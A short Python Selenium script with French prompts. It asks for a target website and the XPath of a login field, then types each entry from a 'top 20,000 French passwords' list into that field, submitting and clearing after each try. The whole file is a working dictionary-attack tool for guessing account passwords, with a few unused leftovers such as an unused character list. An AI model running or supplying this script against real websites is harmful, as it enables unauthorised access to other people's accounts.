import time
from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.common.keys import Keys
from selenium.webdriver.chrome.service import Service
from webdriver_manager.chrome import ChromeDriverManager
from selenium.webdriver.chrome.options import Options

liste = [
  'a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n', 'o',
  'p', 'q', 'r', 's', 't', 'u', 'v', 'w', 'x', 'y', 'z', 'A', 'B', 'C', 'D',
  'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S',
  'T', 'U', 'V', 'W', 'X', 'Y', 'Z', '1', '2', '3', '4', '5', '6', '7', '8',
  '9', '0', '!', '@', '*', '?', '§', '%', '$', '£', 'µ'
]

f = open("french_passwords_top20000.txt", "r")
mdps = f.read().split("\n")
f.close()

timeSleep = 0.5

website = input("Quel site voulez_vous prendre pour cible")

service = Service(ChromeDriverManager().install())
driver = webdriver.Chrome(service=service)
driver.get(website)

xpath = input("Tapez le xpath")

input_xpath_messageBox = xpath
input_messageBox = driver.find_element(by=By.XPATH,
                                       value=input_xpath_messageBox)
time.sleep(timeSleep)

print("Le processus peut commencer")

for word in mdps:
  for letter in word:
    input_messageBox.send_keys(letter)
  input_messageBox.send_keys(Keys.ENTER)
  for i in range(len(word)):
    input_messageBox.send_keys(Keys.BACKSPACE)
  time.sleep(timeSleep)

print("Mot de Passe introuvable")
f = open("french_passwords_top20000.txt", "a+")
